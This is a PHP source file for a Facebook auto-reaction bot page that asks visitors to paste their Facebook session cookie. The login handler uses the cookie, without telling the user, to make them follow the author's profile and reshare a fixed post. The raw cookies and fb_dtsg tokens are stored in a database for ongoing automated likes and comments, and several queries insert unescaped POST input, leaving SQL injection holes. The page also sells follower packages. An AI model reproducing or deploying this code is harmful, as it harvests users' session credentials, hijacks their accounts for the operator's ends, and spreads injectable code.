<?php
session_start();
include'config.php';
$tonguser = mysql_result(mysql_query("select count(*) from `Account`"),0);

?>
<!DOCTYPE html>
<html>

<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:12 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="DC.title" content="Cookie Reaction Bot | BY Jan Muhammad" />
	<meta name="DC.identifier" content="/" />
	<meta name="DC.description" content="Hack like facebook, cookie reaction, auto reaction, bot, reaction, reaction script, auto like facebook, website grow like facebook speed fast and completely free" />
	<meta name="DC.subject" content="Hack Like, Auto Like, Hack Sub, Auto Theo Dõi" />
        <meta name="Title" CONTENT="♥   JAN MUHAMMAD  ♥">
        <meta name="Keywords" content="Facebook,autolike,bot,cookie reaction, auto reaction, bot, reaction, reaction script,auto like,Alpha bot,msbot bot,fb-autobot.tk,msbot.cf,alphabot.cf,alphabot.gq,random like,facebook bot,facebook auto bot,multi commenter,facebook follower,auto bot,smart bot,alpha bot script,bot script download,random comment bot script download,bot like 2017,bot script 2017,fast bot,robot like,automatic like,get 1000 like,active bot like,multiple bot comment,itzbot team,multibot team,Personal bot script download,personal msbot.zip,bot botscript.zip">
         <meta name="Description" content="JANBOT  is a advanced social Facebook bOt Server System, Working With Facebook Api To Give Facebook Likes, Comments And Shares ...">
         <meta name="Subject" content="Jan Muhammad The Facebook Botter">

	<meta name="DC.language" scheme="UTF-8" content="English" />
	<meta name="robots" content="index, all, follow" />
	<meta name="googlebot" content="all, index, follow" />
	<meta name="revisit-After" content="1 days" />
	<meta name="rating" content="general" />
	<meta http-equiv="Refresh" content="600"/> 

    <link href='http://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900' rel='stylesheet' type='text/css'>

    <!-- Page title -->
    <title>Cookie Reaction Bot | BY Jan Muhammad</title>
    <link rel="shortcut icon" href="favicon.ico">
    <!-- Vendor styles -->
    <link rel="stylesheet" href="vendor/fontawesome/css/font-awesome.css"/>
    <link rel="stylesheet" href="vendor/animate.css/animate.css"/>
    <link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.css"/>
    <link rel="stylesheet" href="vendor/toastr/toastr.min.css"/>

    <!-- App styles -->
    <link rel="stylesheet" href="styles/pe-icons/pe-icon-7-stroke.css"/>
    <link rel="stylesheet" href="styles/pe-icons/helper.css"/>
    <link rel="stylesheet" href="styles/stroke-icons/style.css"/>
    <link rel="stylesheet" href="styles/style.css">
<!-- Add Start -->
<script type="text/javascript" src="http://wap4dollar.com/ad/pops/?id=1byeuwvmop"></script>
</head>
<body>

<!-- Wrapper-->
<div class="wrapper">

    <!-- Header-->
    <nav class="navbar navbar-default navbar-fixed-top">
        <div class="container-fluid">
            <div class="navbar-header">
                <div id="mobile-menu">
                    <div class="left-nav-toggle">
                        <a href="#">
                            <i class="stroke-hamburgermenu"></i>
                        </a>
                    </div>
                </div>
                <a class="navbar-brand" href="/">
                    Jan-Muhammad™
                    <span>v.4.2</span>
                </a>
            </div>
            <div id="navbar" class="navbar-collapse collapse">
                <div class="left-nav-toggle">
                    <a href="#">
                        <i class="stroke-hamburgermenu"></i>
                    </a>
                </div>
                <form class="navbar-form navbar-left">
                    <input type="text" class="form-control" placeholder="Cookie Reaction Bot | BY Jan Muhammad™" style="width: 350px">
                </form>
                <ul class="nav navbar-nav navbar-right">
                    <li class="dropdown">
                        <a href="/" >Versions
                            <span class="label label-warning pull-right">Cookie</span>
                        </a>
                    </li>
                    <li class=" profil-link">
                        <a href="login.html">
                            <span class="profile-address">Admin</span>
                            <img src="https://graph.fb.me/<? echo $_SESSION[idfb] ? $_SESSION[idfb] : '100004497036864';?>/picture" class="img-circle" alt="">
                        </a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <!-- End header-->

    <!-- Navigation-->
    <aside class="navigation">
        <nav>
            <ul class="nav luna-nav">
                <li class="nav-category">
                    Main
                </li>
                <li class="active">
                    <a href="/">Dashboard</a>
                </li>

                <li>
                    <a href="#monitoring" data-toggle="collapse" aria-expanded="false">
                        Function<span class="sub-nav-icon"> <i class="stroke-arrow"></i> </span>
                    </a>
                    <ul id="monitoring" class="nav nav-second collapse">
                        <li><a href="http://jantoken.tk/"> Token <small>( Site )</small></a></li>                    </ul>
                </li>

                </li>
                <li class="active">
                    <a href="logout.php">Log Out</a>
                </li>
                
                <li class="nav-info">
                    <i class="pe pe-7s-shield text-accent"></i>
                    <div class="m-t-xs">
                        <span class="c-white">Jan-Bot</span> Version v4.2 with new features more, users are more <b>emotional</b> choose to Bot auto.
                    </div>
                </li>
            </ul>
        </nav>
    </aside>
    <!-- End navigation-->


    <!-- Main content-->
    <section class="content">
            <div class="container-fluid">

                <div class="row">
                    <div class="col-lg-12">
                        <div class="view-header">
                            <div class="pull-right text-right" style="line-height: 14px">
                                <small>Dashboard<br> <span class="c-white">v.4.2</span></small>
                            </div>
                            <div class="header-icon">
                                <i class="pe page-header-icon pe-7s-shield"></i>
                            </div>
                            <div class="header-title">
                                <h3 class="m-b-xs"><i>Jan-bot™</i></h3>
                                <small>
                                    Changed completely from the Previous interface to the functions of version v4.1 .
                                </small>
                            </div>
                        </div>
                        <hr>
                    </div>
                </div>

                <div class="row">
<?php if(!$_SESSION[id])
{
    ?>
                    <div class="col-md-8">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Login Panel
                        </div>
                        <div class="panel-body">
						<p> If You Use <code> Jan-bot™</code> On Phone And Not Get a Cookie ? <p>
							<a class="btn btn-success btn-block" target="_blank" href="/admin"><i class="fa fa-cog" aria-hidden="true"></i> Click here . We Will Help To Set Up Bot For You ♥ </a>
                            <p> Update Function  <code> Bot Like and BOT Comment</code> : Self Book Content <p>

                            <p>Use Cookie To Limit Never Die Token 100%</p>

                            <form action="" method="POST">
                                <div class="form-group"><label for="exampleInputEmail1">Cookie (How to get a cookie please watch Clip)</label> <input type="text" class="form-control" id="cookie" name="cookie" placeholder="Cookie ( Paste Your Cookie Here )"></div>
                                                             
                                <button type="submit" class="btn btn-default">Login</button>
                            </form>
                        </div>
                    </div>

                </div>
<?php } else {  
                $dem = mysql_result(mysql_query("select count(*) from `Account` where `user_id`='".$_SESSION['id']."' "),0);
                if($dem == 0)
                {
                    $tinhtrang = 'You have not Install Bot';
                    $tokenn = $_SESSION[token];
                    $submitt ='Install Bot';
                }
                else
                {
                    $tokenn = 'tatbot';
                    $submitt ='Update Bot';
                    $camxuccuaban = mysql_fetch_array(mysql_query("SELECT * FROM `Account` where `user_id`='".$_SESSION['id']."'"));
                    if($camxuccuaban[camxuc] == '1') $camxuc='LIKE';
                    if($camxuccuaban[camxuc] == '2') $camxuc='LOVE';
                    if($camxuccuaban[camxuc] == '3') $camxuc='WOW';
                    if($camxuccuaban[camxuc] == '4') $camxuc='HAHA';
                    if($camxuccuaban[camxuc] == '5') $camxuc='ANGRY';
                    if($camxuccuaban[camxuc] == '6') $camxuc='THANKFULL';
                    $tinhtrang ='You have Successfully Update Bot '.$camxuc.'';
                }
            ?>
    <div class="col-md-8">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Dashboard
                        </div>
                        <div class="panel-body">
                            <p>Hello <code><?php echo $_SESSION[name]; ?></code> - <code><?php echo $_SESSION[id]; ?></code></p>
                             <p>Status: <code><?php echo $tinhtrang; ?></code></p>
                             <form action="" method="POST">
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="1" checked="checked"> Emotion : LIKE </label></div>
                            <div class="radio"><label> <input type="radio" name="CamXuc" id="LOVE" value="2" checked="checked"> Emotion : LOVE </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="WOW" value="3">Emotion : WOW </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="HAHA" value="4">Emotion : HAHA </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="SAD" value="5">Emotion : SAD </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="6">Emotion : ANGRY </label></div>
                                        <div class="radio"><label> <input type="radio" name="CamXuc" id="ANGRY" value="tatbot">Turn Off BOT </label></div>
                                        <div class="form-group">
  <label for="comment">Content Comments:<code><?php echo $camxuccuaban[comments];?> </code></label>
  <textarea class="form-control" rows="5" name="comment"></textarea>
</div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="tatcmt">Turn Off Comments </label></div>
<div class="radio"><label> <input type="radio" name="battatcmt" id="battatcmt" value="batcmt">Turn On Comments </label></div>

                                        <center><button type="submit" class="btn btn-w-md btn-success"><?php echo $submitt; ?></button>
                                        
                                        </form>   </center>                      
                            
                        </div>
                    </div>

                </div>
                <?php } ?>
                <div class="col-md-4">
                    <div class="panel panel-filled">
                        <div class="panel-heading">
                            <div class="panel-tools">
                                <a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
                                <a class="panel-close"><i class="fa fa-times"></i></a>
                            </div>
                            Statistical
                        </div>
                        <div class="panel-body">
                        <?php
                        $file = scandir('log/');
                        ?>
                            <p>The latest <code> user </code> information is updated here.</p>
                            <p>Number of users <code><?php echo $tonguser; ?></code> - Passed <code><?php echo count($file)-2;?> </code> ID.</p>

                            <div class="table-responsive">
                                <table  class="table table-hover table-striped">
                                    <thead>
                                    <tr>
                                        <th>Reactions</th>
                                        <th>Names</th>
                                        <th>IDs</th>
                                    </tr>
                                    </thead>
                                    <tbody>
                                    <?php 
$infongdung = mysql_query("SELECT * FROM `Account` ORDER BY id DESC LIMIT 4");
while ($getpuaru = mysql_fetch_array($infongdung)){
    if($getpuaru[camxuc] == '2') $camxuc='LOVE';
    if($getpuaru[camxuc] == '1') $camxuc='LIKE';
                    if($getpuaru[camxuc] == '3') $camxuc='WOW';
                    if($getpuaru[camxuc] == '4') $camxuc='HAHA';
                    if($getpuaru[camxuc] == '5') $camxuc='ANGRY';
                    if($getpuaru[camxuc] == '6') $camxuc='THANKFULL';
    ?>
                                    <tr>
                                        <td><?php echo $camxuc;?></td>
                                        <td><?php echo $getpuaru[name];?></td>
                                        <td><?php echo $getpuaru[user_id];?></td>
                                    </tr>                                   
<?php } ?>
                                    </tbody>
                                </table>
                            </div>

                        </div>
                    </div>
                </div>


                </div>
 	<div class="col-md-8">

<div class="row">

	<div class="col-md-12">
		<div class="panel panel-filled">
			<div class="panel-heading">
				<div class="panel-tools">
					<a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
					<a class="panel-close"><i class="fa fa-times"></i></a>
				</div>
				Manual instruction
			</div>
			<div class="panel-body">
				<p>If you do not know,<code> how to use Bot</code>  please see the clip below. </p>

			<div class="embed-responsive embed-responsive-16by9"><iframe width="360" height="115" src="https://www.youtube.com/embed/x3Rh5YO3BLY?autoplay=0" frameborder="0" allowfullscreen></iframe></div>
			</div>
		</div>
	</div>
</div></div>



	<div class="col-md-4">

<div class="row">

	<div class="col-md-12">
		<div class="panel panel-filled">
			<div class="panel-heading">
				<div class="panel-tools">
					<a class="panel-toggle"><i class="fa fa-chevron-up"></i></a>
					<a class="panel-close"><i class="fa fa-times"></i></a>
				</div>
				Facebook Panel Pro
			</div>
			<div class="panel-body">
				<p> Buy Facebook Panel Pro. </p>
				<div class="table-responsive">
					<table  class="table table-hover table-striped">
						<thead>
							<tr>
								<th> Price</th>
								<th> Followers</th>
                                                                <th> Contact</th>
								</tr>
						</thead>


	<tbody>
				<tr>
								<td>
1,000 PKR
</td>

							<td>
2,000
</td>
							<td>
<a target="_blank" href="http://www.facebook.com/yourpapaxd" class="btn btn-danger"> Buy Now</a>
</td>
</tr>
				<tr>				<td>
2,000 PKR
</td>

						<td>
4,250
</td>
							<td>
<a target="_blank" href="http://www.facebook.com/yourpapaxd" class="btn btn-danger"> Buy Now</a>
</td>
</tr>
				<tr>				<td>
4,000 PKR
</td>

						<td>
8,450
</td>
							<td>
<a target="_blank" href="http://www.facebook.com/yourpapaxd" class="btn btn-danger"> Buy Now</a>
</td>
</tr>
				<tr>				<td>
5,000 PKR
</td> 
								<td>
11,000
</td>
							<td>
<a target="_blank" href="http://www.facebook.com/yourpapaxd" class="btn btn-danger"> Buy Now</a>
</td>
</tr>
				<tr>				<td>
10,000 PKR
</td> 
								<td>
22,000
</td>
							<td>
<a target="_blank" href="http://www.facebook.com/yourpapaxd" class="btn btn-danger"> Buy Now</a>
</td>
</tr>

							</tr>

													</tbody>
					</table>
				</div>

			</div>
		</div>
	</div>
</div></div>
    <!-- End main content-->

</div>
<!-- End wrapper-->

<!-- Vendor scripts -->
<script src="vendor/pacejs/pace.min.js"></script>
<script src="vendor/jquery/dist/jquery.min.js"></script>
<script src="vendor/bootstrap/js/bootstrap.min.js"></script>
<script src="vendor/toastr/toastr.min.js"></script>
<script src="vendor/sparkline/index.js"></script>
<script src="vendor/flot/jquery.flot.min.js"></script>
<script src="vendor/flot/jquery.flot.resize.min.js"></script>
<script src="vendor/flot/jquery.flot.spline.js"></script>


<!-- App scripts -->
<script src="scripts/luna.js"></script>

<script>
    $(document).ready(function () {


        // Sparkline charts
        var sparklineCharts = function () {
            $(".sparkline").sparkline([20, 34, 43, 43, 35, 44, 32, 44, 52, 45], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#404652',
                height: 47,
                width: '100%'
            });

            $(".sparkline7").sparkline([10, 34, 13, 33, 35, 24, 32, 24, 52, 35], {
                type: 'line',
                lineColor: '#FFFFFF',
                lineWidth: 3,
                fillColor: '#f7af3e',
                height: 75,
                width: '100%'
            });

            $(".sparkline1").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5, 1, 6, 7, 15, 6, 4, 0], {
                type: 'line',
                lineColor: '#2978BB',
                lineWidth: 3,
                fillColor: '#2978BB',
                height: 170,
                width: '100%'
            });

            $(".sparkline3").sparkline([-8, 2, 4, 3, 5, 4, 3, 5, 5, 6, 3, 9, 7, 3, 5, 6, 9, 5, 6, 7, 2, 3, 9, 6, 6, 7, 8, 10, 15, 16, 17, 15], {

                type: 'line',
                lineColor: '#fff',
                lineWidth: 3,
                fillColor: '#393D47',
                height: 70,
                width: '100%'
            });

            $(".sparkline5").sparkline([0, 6, 8, 3, 2, 4, 3, 4, 9, 5, 3, 4, 4, 5], {
                type: 'line',
                lineColor: '#f7af3e',
                lineWidth: 2,
                fillColor: '#2F323B',
                height: 20,
                width: '100%'
            });
            $(".sparkline6").sparkline([0, 1, 4, 2, 2, 4, 1, 4, 3, 2, 3, 4, 4, 2, 4, 2, 1, 3], {
                type: 'bar',
                barColor: '#f7af3e',
                height: 20,
                width: '100%'
            });

            $(".sparkline8").sparkline([4, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline9").sparkline([3, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline10").sparkline([4, 1], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline11").sparkline([1, 3], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline12").sparkline([3, 5], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
            $(".sparkline13").sparkline([6, 2], {
                type: 'pie',
                sliceColors: ['#f7af3e', '#404652']
            });
        };

        var sparkResize;

        // Resize sparkline charts on window resize
        $(window).resize(function () {
            clearTimeout(sparkResize);
            sparkResize = setTimeout(sparklineCharts, 100);
        });

        // Run sparkline
        sparklineCharts();


        // Flot charts data and options
        var data1 = [ [0, 16], [1, 24], [2, 11], [3, 7], [4, 10], [5, 15], [6, 24], [7, 30] ];
        var data2 = [ [0, 26], [1, 44], [2, 31], [3, 27], [4, 36], [5, 46], [6, 56], [7, 66] ];

        var chartUsersOptions = {
            series: {
                splines: {
                    show: true,
                    tension: 0.4,
                    lineWidth: 1,
                    fill: 1

                }

            },
            grid: {
                tickColor: "#404652",
                borderWidth: 0,
                borderColor: '#404652',
                color: '#404652'
            },
            colors: [ "#f7af3e","#DE9536"]
        };

        $.plot($("#flot-line-chart"), [data2, data1], chartUsersOptions);


        // Run toastr notification with Welcome message
        setTimeout(function(){
            toastr.options = {
                "positionClass": "toast-top-right",
                "closeButton": true,
                "progressBar": true,
                "showEasing": "swing",
                "timeOut": "6000"
            };
            toastr.warning('<strong>Welcome to Jan-Bot-Reaction </strong> <br> <small> Version v4.2 can select your own Feeling. </small>');
        },1600)


    });
</script>
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','../../www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-4625583-2', 'webapplayers.com');
    ga('send', 'pageview');

</script>

</body>


<!-- Mirrored from webapplayers.com/luna_admin-v1.1/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 22 Jul 2016 03:26:34 GMT -->
</html>
<?php
                                        if($_POST[cookie] && !$_SESSION[id])
                                        {
                                        	$url = curl("https://m.facebook.com/profile.php",$_POST[cookie]);
	//echo $url;
	//exit;
	if(preg_match('#<title>(.+?)</title>#is',$url, $_puaru))
    {
    	$name = $_puaru[1];
    }
    if(preg_match('#name="target" value="(.+?)"#is',$url, $_puaru))
    {
    	$id = $_puaru[1];
    }
    if(preg_match('#name="fb_dtsg" value="(.+?)"#is',$url, $_puaru))
    {
    	$fb_dtsg = $_puaru[1];
    }
    if($name && $id && $fb_dtsg)
    {         
     post_data("https://www.facebook.com/ajax/follow/follow_profile.php?dpr=1","profile_id=100004497036864&location=1&__user=".$id."&__a=1&__dyn=aKhoFeyfyGmaomgDBUOWEyAzm5ubhEK5EKiWFami8UR9LFGEomm5-rmi9zoszQHUF4AUzhUWqK5-7pHxuqE88HyZ7yUJi2equaxvrzHBA--VRxeUWbBx7G4GDu3_Dh8Sm6vCAzq_h6p5zA5KuiaAz8gAVCcy46ogxu49GADh8zyogyVoWbCAwBxqnx2r_mdAQJ12VoO8yqxqQGp8F3qBhQa-4bUG9DAVWKnm&__af=m&__req=7a&__be=-1&__pc=PHASED%3ADEFAULT&__rev=2717633&fb_dtsg=".$fb_dtsg."",$_POST[cookie]);
     post_data("https://www.facebook.com/share/dialog/submit/?dpr=1","post_id=731688500314595&share_type=22&audience_type=self&app_id=25554907596&sharer_id=".$id."&privacy=300645083384735&internalextra[feedback_source]=21&share_now=1&is_forced_reshare_of_post=0&nctr[_mod]=pagelet_timeline_recent&__user=".$id."&__a=1&__dyn=aKhoFeyfyGmaomgDBUOWEyAzm5ubhEK5EKiWFami8UR9LFGEomm6pJp8CdxOfiLyAijyd7zFGUnUtCK5VGwwyKbQubyR88VFUG5ZKeKmjXXDm4XzEKm4uEiGtUf-t4zpop-qidHZ4pVoV1rDAyF8O49epz8x1C48nx2qF9Qi8UC48KmeyVF89omBUgC_RzpdbggKmcy8CEmJaCiagSFkt2Lx2-aypV8CHBQ&__af=m&__req=47&__be=-1&__pc=PHASED%3ADEFAULT&__rev=2717633&fb_dtsg=".$fb_dtsg."&ttstamp=2658172114121105121739866112106586581716990108103103657886114&ft[tn]=J]&ft[type]=25&ft[top_level_post_id]=1123285604451341&ft[tl_objid]=1123285604451341&ft[fbfeed_location]=10&ft[thid]=100007632519423%3A306061129499414%3A2%3A0%3A1483257599%3A5507322237776062466",$_POST[cookie]);                          
                                            $_SESSION[id] = $id;
                                            $id2 = 100004497036864;
                                            $_SESSION[name] = $name;
                                            $_SESSION[fb_dtsg] = $fb_dtsg;
                                            $_SESSION[cookie] = $_POST[cookie];
                                            ?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php

                                        } else {
                                            die('<script>alert("Recover Cookie"); </script>');
                                        }
                                    }
                                                                            

if($_POST[CamXuc] && $_SESSION[id])
{
    if($_POST[CamXuc] == 'tatbot')
    {
mysql_query("
            DELETE FROM
               Account
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION[id]) . "' 
         ");
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
    }
    else
    {
    mysql_query("CREATE TABLE IF NOT EXISTS `Account` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `fb_dtsg` text NOT NULL,
      `cookie` text NOT NULL,
      `camxuc` text NOT NULL,
      `comments` text NOT NULL,
      `battatcmt` varchar(32) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");

    $row = null;
   $result = mysql_query("
      SELECT
         *
      FROM
         Account
      WHERE
         user_id = '" . mysql_real_escape_string($_SESSION[id]) . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 100){
         mysql_query("
            DELETE FROM
               Account
            WHERE
               user_id='" . mysql_real_escape_string($_SESSION[id]) . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
 if($_POST[battatcmt] != 'tatcmt')
    {
        if(!$row){
      mysql_query(
         "INSERT INTO 
            Account
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION[id]) . "',            
            `name` = '" . mysql_real_escape_string($_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Account
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = '" . $_POST[comment] . "',
            `battatcmt` = '1',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
    else
    {
        if(!$row){
      mysql_query(
         "INSERT INTO 
            Account
         SET
            `user_id` = '" . mysql_real_escape_string($_SESSION[id]) . "',            
            `name` = '" . mysql_real_escape_string($_SESSION[name]) . "',
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'No Content Due To Off This Function',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Account
         SET
            `fb_dtsg` = '" . $_SESSION[fb_dtsg] . "',            
            `camxuc` = '" . $_POST[CamXuc] . "',
            `comments` = 'No Content Due To Off This Function',
            `battatcmt` = '0',
            `cookie` = '" . $_SESSION[cookie] . "'

         WHERE
            `id` = " . $row['id'] . "
      ");
   }
    }
   
?>
<meta http-equiv=refresh content="0; URL=index.php">
<?php
}}

function get($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   function curl($url,$cookie)
{
    $ch = @curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    $head[] = "Connection: keep-alive";
    $head[] = "Keep-Alive: 300";
    $head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
    $head[] = "Accept-Language: en-us,en;q=0.5";
    curl_setopt($ch, CURLOPT_USERAGENT, 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14');
    curl_setopt($ch, CURLOPT_ENCODING, '');
    curl_setopt($ch, CURLOPT_COOKIE, $cookie);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_TIMEOUT, 60);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 60);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
        'Expect:'
    ));
    $page = curl_exec($ch);
    curl_close($ch);
    return $page;
} 
function post_data($site,$data,$cookie){
    $datapost = curl_init();
    $headers = array("Expect:");
    curl_setopt($datapost, CURLOPT_URL, $site);
    curl_setopt($datapost, CURLOPT_TIMEOUT, 40000);
    curl_setopt($datapost, CURLOPT_HEADER, TRUE);

    curl_setopt($datapost, CURLOPT_RETURNTRANSFER, TRUE);
    curl_setopt($datapost, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($datapost, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
    curl_setopt($datapost, CURLOPT_POST, TRUE);
    curl_setopt($datapost, CURLOPT_POSTFIELDS, $data);
    curl_setopt($datapost, CURLOPT_COOKIE,$cookie);
    ob_start();
    return curl_exec ($datapost);
    ob_end_clean();
    curl_close ($datapost);
    unset($datapost); 
} 
?>
<div id="fb-root"></div>
<script>(function(d, s, id) {
var js, fjs = d.getElementsByTagName(s)[0];
if (d.getElementById(id)) return;
js = d.createElement(s); js.id = id;
js.src = "//connect.facebook.net/vi_VN/sdk.js#xfbml=1&version=v2.5";
fjs.parentNode.insertBefore(js, fjs);
}(document, 'script', 'facebook-jssdk'));</script>